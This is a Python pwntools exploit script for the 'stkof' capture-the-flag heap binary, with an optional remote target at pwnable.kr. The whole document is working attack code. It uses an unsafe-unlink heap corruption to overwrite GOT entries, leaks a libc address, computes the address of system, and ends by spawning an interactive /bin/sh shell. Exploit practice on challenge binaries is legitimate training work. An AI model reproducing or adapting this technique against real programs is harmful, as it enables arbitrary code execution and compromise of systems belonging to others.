#!/usr/bin/python
from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'

local = True

e = ELF("./stkof")
if local :
  s = process("./stkof")
else :
  s = remote("pwnable.kr", 9001)

lib = None
if local :
  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else : 
  lib = ELF("./bf_libc.so")

#gdb.attach(s)

def alloc(size) :
  s.sendline("1")
  s.sendline(str(size))
  s.recvuntil("OK")

def fill(i, m) :
  s.sendline("2")
  s.sendline(str(i))
  s.sendline(str(len(m)))
  s.sendline(m)
  s.recvuntil("OK")

def free(i) :
  s.sendline("3")
  s.sendline(str(i))
  s.recvuntil("OK")

def nothing(i) :
  s.sendline("4")
  s.sendline(str(i))
  return s.recvuntil("OK")

alloc(256)
alloc(256)
alloc(256)
alloc(256)

array_head = 0x602158

fill(3, p64(0) + p64(0x101) + p64(array_head - 0x18) + p64(array_head - 0x10) + "a"*(256 - 8*4) + p64(0x100) + p64(0x110))

free(4)

target = 0x602030 #strlen.got
libc = 0x602050 #libc_start_main
goal = 0x400760 #puts.plt
fill(3, "\x00" * 0x8 + p64(target) + p64(libc))
fill(1, p64(goal))

#log.info(hexdump(nothing(2)))
libc_start_main = u64(nothing(2)[6:12] + "\x00\x00")

libc_base = libc_start_main - 0x20740
system = libc_base + 0x45390

target = 0x602080
fill(3, "\x00" * 0x8 + p64(target))
fill(1, p64(system))
s.sendline("4")
s.sendline("/bin/sh")

s.interactive()
